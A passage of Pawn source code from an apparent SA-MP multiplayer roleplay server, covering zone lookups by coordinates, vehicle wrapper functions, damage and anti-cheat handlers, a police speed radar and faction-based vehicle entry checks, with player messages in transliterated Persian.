    {"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
    {"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
    {"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
    {"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
    {"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
    {"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
    {"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
    {"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
    {"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
    {"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
    {"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
    {"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
    {"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
    {"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
    {"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
    {"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
    {"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
    {"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
    {"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
    {"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
    {"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
    {"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
    {"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
    {"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
    {"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
    {"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
    {"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
    {"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
    {"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
    {"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
    {"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
    {"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
    {"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
    {"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
    {"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
    {"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
    {"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
    {"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
    {"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
    {"The Four Dragons Casino",     {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
    {"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
    {"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
    {"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
    {"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
    {"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
    {"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
    {"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
    {"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
    {"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
    {"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
    {"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
    {"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
    {"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
    {"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
    {"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
    {"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
    {"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
    {"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
    {"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
    {"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
    {"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
    {"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
    {"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
    {"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
    {"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
    {"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
    {"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
    {"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
    {"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
    {"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
    {"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
    {"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
    {"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
    {"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
    {"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
    {"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
    // Main Zones
    {"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
    {"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
    {"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
    {"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
    {"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
    {"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

stock GetPlayer3DZone(playerid, zone[], len)
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    for(new i = 0; i != sizeof(gSAZones); i++ )
    {
        if(x >= gSAZones[i][SAZONE_AREA][0] && x <= gSAZones[i][SAZONE_AREA][3] && y >= gSAZones[i][SAZONE_AREA][1] && y <= gSAZones[i][SAZONE_AREA][4])
        {
            return format(zone, len, gSAZones[i][SAZONE_NAME], 0);
        }
    }
    return 0;
}

stock GetPlayerZoneName(playerid, zone[], len = sizeof(zone))
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    if(Mahal[playerid] == 1) return format(zone, len, "Paintball (LS)");
    if(Mahal[playerid] == 2) return format(zone, len, "Jail (LS)");
    if(Mahal[playerid] == 3) return format(zone, len, "in his/her home");
    if(Mahal[playerid] == 4) return format(zone, len, "CityHall (LS)");
    if(Mahal[playerid] == 5) return format(zone, len, "LSPD (LS)");
    if(Mahal[playerid] == 6) return format(zone, len, "FBI HQ (LV)");
    if(Mahal[playerid] == 70) return format(zone, len, "Paramedic HQ (LV)");
    if(Mahal[playerid] == 7) return format(zone, len, "Silence Mafia HQ (LS)");
    if(Mahal[playerid] == 8) return format(zone, len, "Fast N Furious HQ  (LV)");
    if(Mahal[playerid] == 9) return format(zone, len, "The killers HQ (LV)");
    if(Mahal[playerid] == 10) return format(zone, len, "Hitman HQ (LS)");
    if(Mahal[playerid] == 11) return format(zone, len, "Storm Men HQ (LS)");
    if(Mahal[playerid] == 12) return format(zone, len, "Dangerous Tigers HQ (LS)");
    if(Mahal[playerid] == 13) return format(zone, len, "Legendary Men HQ (LS)");
    if(Mahal[playerid] == 14) return format(zone, len, "Taxi HQ (LV)");
    if(Mahal[playerid] == 15) return format(zone, len, "in a business");
    if(Mahal[playerid] == 199) return format(zone, len, "Staff HQ (LS)");
    if(Mahal[playerid] == 212) return format(zone, len, "JG Clan HQ (LS)");
    if(Mahal[playerid] == 214) return format(zone, len, "JG Clan HQ (LS)");
	if(Mahal[playerid] == 2145) return format(zone, len, "EVIL Clan HQ (LS)");
    if(Mahal[playerid] == 357) return format(zone, len, "GG Clan HQ (LS)");
    if(Mahal[playerid] == 9524) return format(zone, len, "SFPD Clan HQ (LS)");
    for(new i = 0; i != sizeof(gSAZones); i++ )
    {
        if(x >= gSAZones[i][SAZONE_AREA][0] && x <= gSAZones[i][SAZONE_AREA][3] && y >= gSAZones[i][SAZONE_AREA][1] && y <= gSAZones[i][SAZONE_AREA][4] && z >= gSAZones[i][SAZONE_AREA][2] && z <= gSAZones[i][SAZONE_AREA][5])
        {
            new string[256];
            if(IsPlayerInArea(playerid, -1078.125, 3058.59375, -3058.59375, 433.59375))
            {
                format(string, 256, "%s (LS)",gSAZones[i][SAZONE_NAME]);
            }
            if(IsPlayerInArea(playerid, -1078.125, 3210.9375, 445.3125, 3000))
            {
                format(string, 256, "%s (LV)",gSAZones[i][SAZONE_NAME]);
            }
            if(IsPlayerInArea(playerid, -3000, -1089.84375, -2988.28125, 2964.84375))
            {
                format(string, 256, "%s (SF)",gSAZones[i][SAZONE_NAME]);
            }
            return format(zone, len, string);
        }
    }
    return 0;
}
/*--------------------------------Vehicle Sys---------------------------------*/
    static
        bool:VehicleByServer[MAX_VEHICLES],
        VehColor[MAX_VEHICLES],
        VehColor2[MAX_VEHICLES],
        VehInt[MAX_VEHICLES];

stock Ali_ChangeVehicleColor(vehid, col1, col2)
{
    VehColor[vehid] = col1;
    VehColor2[vehid] = col2;
    return ChangeVehicleColor(vehid, col1, col2);
}

stock GetVehicleColor(vehid, &col1, &col2)
{
    col1 = VehColor[vehid];
    col2 = VehColor2[vehid];
}

stock Ali_AddStaticVehicle(modelID, Float: spawn_X, Float: spawn_Y, Float: spawn_Z, Float: z_Angle, color1, color2)
{
        new col1 = color1;
        if(color1 < 0)
        {
            col1 = random(127);
        }
        new col2 = color2;
        if(color2 < 0)
        {
            col2 = random(127);
        }
        new vehicleid = AddStaticVehicle(modelID, spawn_X, spawn_Y, spawn_Z, z_Angle, col1, col2);
        VehicleByServer[vehicleid] = true;
        VehColor[vehicleid] = col1;
        VehColor2[vehicleid] = col2;
        VehInt[vehicleid] = 0;
        OnVehicleSpawn(vehicleid);
        return vehicleid;
}
stock ExamCheckpoint(playerid,cp,Float:x,Float:y,Float:z,Float:x2,Float:y2,Float:z2)
{
	new string[64];
	format(string,sizeof(string),"~w~Shoma Marhale ~g~%d ~w~Az ~g~30 ~w~Hastid",cp-100);
	TextDrawSetString(TD_Exam[playerid][0], string);
	DisablePlayerRaceCheckpoint(playerid);
	OnCheckpoint[playerid] = 1;
	SetPlayerRaceCheckpoint(playerid,0,x,y,z,x2,y2,z2,5.0);
	RCP[playerid] = cp;
	PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
}
stock Ali_LinkVehicleToInterior(vehid, inter)
{
    VehInt[vehid] = inter;
    return LinkVehicleToInterior(vehid, inter);
}

stock udb_hash(buf[])
{
	new length=strlen(buf);
	new s1 = 1;
	new s2 = 0;
	new n;
	for (n=0; n<length; n++)
	{
		s1 = (s1 + buf[n]) % 65521;
		s2 = (s2 + s1)     % 65521;
	}
	return (s2 << 16) + s1;
}
stock GetVehicleInterior(vehicleid) return VehInt[vehicleid];

stock Ali_AddStaticVehicleEx(modelID, Float: spawn_X, Float: spawn_Y, Float: spawn_Z, Float: z_Angle, color1, color2, respawn_Time)//Will ignore respawn_Time
{
        #pragma unused respawn_Time
        new col1 = color1;
        if(color1 < 0)
        {
            col1 = random(127);
        }
        new col2 = color2;
        if(color2 < 0)
        {
            col2 = random(127);
        }
        new vehicleid;
        vehicleid = AddStaticVehicleEx(modelID, spawn_X, spawn_Y, spawn_Z, z_Angle, color1, color2, 1200);
        VehicleByServer[vehicleid] = true;
        VehColor[vehicleid] = col1;
        VehColor2[vehicleid] = col2;
        VehInt[vehicleid] = 0;
        OnVehicleSpawn(vehicleid);
        return vehicleid;
}

stock Ali_CreateVehicle(modelID, Float: spawn_X, Float: spawn_Y, Float: spawn_Z, Float: z_Angle, color1, color2, respawn_Time, bool:modelchanged = false)
{
        new col1 = color1;
        if(color1 < 0)
        {
            col1 = random(127);
        }
        new col2 = color2;
        if(color2 < 0)
        {
            col2 = random(127);
        }
        new vehicleid;
        vehicleid = CreateVehicle(modelID, spawn_X, spawn_Y, spawn_Z, z_Angle, color1, color2, respawn_Time);
        VehicleByServer[vehicleid] = true;
        VehColor[vehicleid] = col1;
        VehColor2[vehicleid] = col2;
        VehInt[vehicleid] = 0;
        if(modelchanged == false)
        {
            OnVehicleSpawn(vehicleid);
        }
        return vehicleid;
}

stock Ali_DestroyVehicle(vehicleid, bool:OwnedMashinD = false)
{
    if(OwnedMashinD == true)
    {
        if(OwnedMashin[vehicleid] != 0 || OwnedMashin_2[vehicleid] != 0)
        {
            VehicleByServer[vehicleid] = false;
            VehColor[vehicleid] = 0;
            VehColor2[vehicleid] = 0;
            VehInt[vehicleid] = 0;
            return DestroyVehicle(vehicleid);
        }
    }
    if(OwnedMashinD == false && OwnedMashin[vehicleid] != 1 && OwnedMashin_2[vehicleid] != 1)
    {
        VehicleByServer[vehicleid] = false;
        VehColor[vehicleid] = 0;
        VehColor2[vehicleid] = 0;
        VehInt[vehicleid] = 0;
        return DestroyVehicle(vehicleid);
    }
    return 0;
}

stock IsVehicleConnected(vehicleid)
{
    if(VehicleByServer[vehicleid] == true) return 1;
    return 0;
}

#if defined _ALS_ChangeVehicleColor
    #undef ChangeVehicleColor
#else
    #define _ALS_ChangeVehicleColor
#endif
#define ChangeVehicleColor Ali_ChangeVehicleColor

#if defined _ALS_LinkVehicleToInterior
    #undef LinkVehicleToInterior
#else
    #define _ALS_LinkVehicleToInterior
#endif
#define LinkVehicleToInterior Ali_LinkVehicleToInterior

#if defined _ALS_AddStaticVehicle
    #undef AddStaticVehicle
#else
    #define _ALS_AddStaticVehicle
#endif
#define AddStaticVehicle Ali_AddStaticVehicle

#if defined _ALS_AddStaticVehicleEx
    #undef AddStaticVehicleEx
#else
    #define _ALS_AddStaticVehicleEx
#endif
#define AddStaticVehicleEx Ali_AddStaticVehicleEx

#if defined _ALS_CreateVehicle
    #undef CreateVehicle
#else
    #define _ALS_CreateVehicle
#endif
#define CreateVehicle Ali_CreateVehicle

#if defined _ALS_DestroyVehicle
    #undef DestroyVehicle
#else
    #define _ALS_DestroyVehicle
#endif
#define DestroyVehicle Ali_DestroyVehicle

stock Ali_SetPlayerWantedLevel(playerid, level)
{
    if(GetPlayerWantedLevel(playerid) >= 1 && level <= 0 && WantedKamKonTimerValid[playerid] == true) KillTimer(WantedKamKonTimer[playerid]);
    if(GetPlayerWantedLevel(playerid) <= 0 && level >= 1 && WantedKamKonTimerValid[playerid] == false) WantedKamKonTimer[playerid] = SetTimerEx("WantedKamKon",2700000,0,"i",playerid);
    if(level <= -1) {level = 0;}
    PINFO[playerid][pWanted] = level;
    SaveKonVal(playerid, "pWanted", level);
    WantedPoints[playerid] = level;
    WantedLevel[playerid] = level;
    //SaveAccount(playerid);
    return SetPlayerWantedLevel(playerid, level);
}

stock Ali_GetPlayerWantedLevel(playerid)
{
    return PINFO[playerid][pWanted];
}

#if defined _ALS_SetPlayerWantedLevel
    #undef SetPlayerWantedLevel
#else
    #define _ALS_SetPlayerWantedLevel
#endif
#define SetPlayerWantedLevel Ali_SetPlayerWantedLevel

#if defined _ALS_GetPlayerWantedLevel
    #undef GetPlayerWantedLevel
#else
    #define _ALS_GetPlayerWantedLevel
#endif
#define GetPlayerWantedLevel Ali_GetPlayerWantedLevel
/*-------------------------------SpeedLimit-----------------------------------*/
forward SetVehicleSpeedLimit( vehicleid, Float:value );
forward DisableVehicleSpeedLimit( vehicleid );

static
    Float:VehicleSpeedLimit[ MAX_VEHICLES ] = { 0.0, ... }
;

public SetVehicleSpeedLimit( vehicleid, Float:value )
{
    if ( 0 <= vehicleid < sizeof( VehicleSpeedLimit ) )
        VehicleSpeedLimit[ vehicleid ] = value/1;
}

public DisableVehicleSpeedLimit( vehicleid )
{
    if ( 0 <= vehicleid < sizeof( VehicleSpeedLimit ) )
        VehicleSpeedLimit[ vehicleid ] = 0.0;
}
/*--------------------------------ANIMATION-----------------------------------*/
LoopingAnim(playerid, animlib[], animname[], Float:Speed, looping, lockx, locky, freeze, time, forcesync = 1)
{
    #pragma unused forcesync
    ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, freeze, time, 1);
}
StopLoopingAnim(playerid)
{
    LoopingAnim(playerid, "CARRY", "crry_prtial", 2.0, 0, 0, 0, 0, 0);
}
PreloadAnimLib(playerid, animlib[])
{
    ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}
/*----------------------------------------------------------------------------*/
/*-----------------------------PUBLIC AND OTHERS ...--------------------------*/
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
    if(AFK[playerid] == 1) return 1;
    if(weaponid >= 47 || weaponid == 51 || weaponid == 37)
    {
        new Float:HA;
        GetPlayerHealth(playerid, HA);
        SetPlayerKhoon(false, playerid, HA-amount);
    }
	if(GodmodeFeature[playerid] == true) {
	SetPlayerKhoon(true, playerid, 100000);
	}
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
	if(amount > 50 || bodypart == 0 || bodypart == 1 || bodypart == 2) {
	new string[512];
	format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}Server detected a killer cheat on %s(%d). (defenced)",PINFO[playerid][pName],playerid);
	print(string);

	return 0;
	}
	new famil;
	if(PlayerInfo[playerid][pLeader] != 0) {famil = PlayerInfo[playerid][pLeader];}
	else if (PlayerInfo[playerid][pLeader] ==0) {famil = PlayerInfo[playerid][pMember];}
	if(SafeZoneCheck[playerid] == 1 &&  SafeOn == 1 && OnWar[playerid] == 9999 && famil != 1 && famil != 2 && famil != 3 && famil != 20) {
	TogglePlayerControllable(playerid, 0);
	SendMessage(playerid, COLOR_LIGHTRED, "You have been automatically frozen for 3 seconds because you hit players in Safezone.");
	SetTimerEx("SafeFreeze",3000,0,"i",playerid);
 }
    if(AFK[damagedid] == 1) return 1;
    if(GodmodeFeature[damagedid] == true) return SetPlayerKhoon(true, damagedid, 100000.0);
    if(weaponid == 34)
    {
        SetPlayerZereh(damagedid, 0);
        return SetPlayerKhoon(false, damagedid, 0);
    }
    if(weaponid <= 46 && weaponid != 37)
    {
        new Float:HA;
        if(Zereh[damagedid] == 0)
        {
            GetPlayerHealth(damagedid, HA);
            SetPlayerKhoon(false, damagedid, HA-amount);
        }
        else if(Zereh[damagedid] > 0)
        {
            GetPlayerArmour(damagedid, HA);
            new Float:zereh = HA-amount;
            if(zereh > 0) Zereh[damagedid] = zereh;
            else {Zereh[damagedid] = 0.0;}
        }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/



/*----------------------------------------------------------------------------*/
public IsInFaction(plyid)
{
    if(IsPlayerConnected(plyid))
    {
        if(PINFO[plyid][pLeader] >= 1 || PINFO[plyid][pMember] >= 1)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public GetPlayerZone(playerid)
{
    for(new i = 0;i<sizeof(TurfInfo);i++)
    {
        if(IsPlayerInTurf(playerid,i))
        {
            return i;
        }
    }
    return -1;
}
/*----------------------------------------------------------------------------*/
public IsPlayerInHQ(playerid)
{
    new mem;
    if(PlayerInfo[playerid][pLeader]) mem = PlayerInfo[playerid][pLeader];
    else mem = PlayerInfo[playerid][pMember];
    if(mem == 5 && Mahal[playerid] == 7)
    {
        return 1;
    }
    if(mem == 6 && Mahal[playerid] == 9)
    {
        return 1;
    }
    if(mem == 8 && Mahal[playerid] == 10)
    {
        return 1;
    }
    if(mem == 12 && Mahal[playerid] == 12)
    {
        return 1;
    }
    if(mem == 13 && Mahal[playerid] == 13)
    {
        return 1;
    }
    if(mem == 14 && Mahal[playerid] == 8)
    {
        return 1;
    }
    if(mem == 15 && Mahal[playerid] == 11)
    {
        return 1;
    }
        if(mem == 17 && Mahal[playerid] == 199)
    {
        return 1;
    }
        if(mem == 19 && Mahal[playerid] == 214)
    {
        return 1;
    }
    return 0;
}


//--------------

/*----------------------------------------------------------------------------*/
IsUnusedMashin(vehicleid)
{
    for(new i = 0;i<LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            if(IsPlayerInVehicle(i,vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER) return 0;
        }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
GetVehicleDriverID(vehicleid)
{
    for(new i = 0;i<LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            if(GetPlayerVehicleID(i) == vehicleid && GetPlayerState(i) == PLAYER_STATE_DRIVER)
            {
                return i;
            }
        }
    }
    return INVALID_PLAYER_ID;
}
/*----------------------------------------------------------------------------*/
public speedcheck(playerid,speed)
{
    for(new i = 0;i < LastPID; i++)
    {
          if(OnSpeedc[playerid] == 1 && IsACop(playerid))
          {
              new veh = GetPlayerVehicleID(i);
              new sppeed = soratbegirs(veh);
              new Float:px,Float:py,Float:pz;
              GetPlayerPos(playerid,px,py,pz);
              if(IsVehicleStreamedIn(GetPlayerVehicleID(i), playerid))
              {
                  if(!IsACop(i) && !IsAPlane(GetPlayerVehicleID(i)) && EngineSTATE[GetPlayerVehicleID(i)] == 1 && i != INVALID_PLAYER_ID && sppeed > speed && MaxSorat[GetPlayerVehicleID(i)] < speed && GetPlayerState(i) == PLAYER_STATE_DRIVER)
                  {
                      new string[256];
                      new myname[MAX_PLAYER_NAME];
                      new tarname[MAX_PLAYER_NAME];
                      GetPlayerName(playerid,myname,MAX_PLAYER_NAME);
                      GetPlayerName(i,tarname,MAX_PLAYER_NAME);
                      format(string,256,"%s ID[%d] using max speed with speed %dkm/h.",tarname,i,sppeed);
                      SCM(playerid,COLOR_LIGHTRED,string);
                      format(string,256,"You used Max speed ( %dkm/h ) and it's Writen on police's Speed Radar by %s, You allowed to use %dkm/h on this road.",sppeed,myname,speed);
                      SCM(i,COLOR_LIGHTRED,string);
                  }
              }
          }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:PointX, Float:PointY, Float:PointZ) return floatsqroot(floatadd(floatadd(floatpower(floatsub(X, PointX), 2.0), floatpower(floatsub(Y, PointY), 2.0)), floatpower(floatsub(Z, PointZ), 2.0)));

stock GetNearestVehicle(playerid, Float:Distance = 1000.0)
{
    if(!Distance) Distance = 1000.0;
    new Float:X[2], Float:Y[2], Float:Z[2], Float:NearestPos = floatabs(Distance), NearestVehicle = INVALID_VEHICLE_ID;
    GetPlayerPos(playerid, X[0], Y[0], Z[0]);
    for(new i; i<MAX_VEHICLES; i++)
    {
        if(!IsVehicleStreamedIn(i, playerid)) continue;
        GetVehiclePos(i, X[1], Y[1], Z[1]);
        if(NearestPos > GetDistanceBetweenPoints(X[0], Y[0], Z[0], X[1], Y[1], Z[1])) NearestPos = GetDistanceBetweenPoints(X[0], Y[0], Z[0], X[1], Y[1], Z[1]), NearestVehicle = i;
    }
    return NearestVehicle;
}
/*----------------------------------------------------------------------------*/
FixKhoon(playerid)
{
    if(Khoon[playerid] >= 75)
    {
        SetPlayerKhoon(true, playerid, 100);
    }
    else
    {
        SetPlayerKhoon(true, playerid, Khoon[playerid]+25);
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public DollahScoreUpdate()
{
    for(new i=0; i<LastPID; i++)
    {
        if(IsPlayerConnected(i)) SetPlayerScore(i, PlayerInfo[i][pLevel]);
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
stock IsUnusedVehicle(vehicleid)
{
    for(new i =0; i<LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(IsPlayerInVehicle(i,vehicleid)) return 0;
        }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(Isjscar(vehicleid))
	{
		if(PlayerInfo[playerid][pJob] != 21)
		{
			SCM(playerid, COLOR_RED, "Shoma Bayad Ranande Sherkat Bashid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
		else
		{
            Sherkat[playerid][1] =  random(3000) + 100;
            Sherkat[playerid][2] =  random(3000) + 100;
            Sherkat[playerid][3] =  random(3000) + 100;
            Sherkat[playerid][4] =  random(3000) + 100;
            new Sstring1[256],Sstring2[256],Sstring3[256],Sstring4[256];
            format(Sstring1,sizeof(Sstring1),"     1- Sherkat Bar Barie Aria ~g~ $%d", Sherkat[playerid][1]);
            format(Sstring2,sizeof(Sstring2),"   2- Sherkat Tane Lash ~g~ $%d", Sherkat[playerid][2])
            format(Sstring3,sizeof(Sstring3),"  3- Sherkat Irancell ~g~ $%d", Sherkat[playerid][3])
            format(Sstring4,sizeof(Sstring4),"     4- Sherkat chayie Ghazal ~g~ $%d", Sherkat[playerid][4])
            PlayerTextDrawSetString(playerid,jtxd[playerid][2],Sstring1);
            PlayerTextDrawSetString(playerid,jtxd[playerid][3],Sstring2);
            PlayerTextDrawSetString(playerid,jtxd[playerid][4],Sstring3);
            PlayerTextDrawSetString(playerid,jtxd[playerid][5],Sstring4);
            //for(new i = 0;i <= 6;i++) PlayerTextDrawShow(playerid,jtxd[playerid][i]);
            PlayerTextDrawShow(playerid,jtxd[playerid][0]);
            PlayerTextDrawShow(playerid,jtxd[playerid][1]);
            PlayerTextDrawShow(playerid,jtxd[playerid][2]);
            PlayerTextDrawShow(playerid,jtxd[playerid][3]);
            PlayerTextDrawShow(playerid,jtxd[playerid][4]);
            PlayerTextDrawShow(playerid,jtxd[playerid][5]);
            PlayerTextDrawShow(playerid,jtxd[playerid][6]);

		}
	}
	if(IsPreCar(vehicleid))
	{
		if(PlayerInfo[playerid][pPremiumAccount] < 1)
		{
            SCM(playerid, COLOR_RED, "Shoma Premium Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	else
    if(GetVehicleDriverID(vehicleid) != INVALID_PLAYER_ID)
	{
		OnEnteringVeh[playerid] = vehicleid;
		OnEnteringVehPlay[playerid] = GetVehicleDriverID(vehicleid);
	}
    else
	{
		OnEnteringVeh[playerid] = 0;
		OnEnteringVehPlay[playerid] = INVALID_PLAYER_ID;
	}
	if(IsACopCar(vehicleid) && !ispassenger)
	{
		if(IsACop(playerid)) {}
		else
		{
			SCM(playerid, COLOR_PD, "Shoma Cop Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsANrcar(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 9||PlayerInfo[playerid][pMember] == 9) { }
		else
		{
			SendClientMessage(playerid, COLOR_BLUE,"You are not a news reporter.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsAnAmbulance(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 4||PlayerInfo[playerid][pMember] == 4) { }
		else
		{
			SendClientMessage(playerid, COLOR_MEDIC,"Shoma Medic Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsAGangCar(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 5||PlayerInfo[playerid][pMember] == 5) { }
		else
		{
			SendClientMessage(playerid, TEAM_CUN_COLOR,"Shoma Ozv Silence Mafia Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsATowcar(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pJob] == 7) { }
		else
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"Shoma Mechanic Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
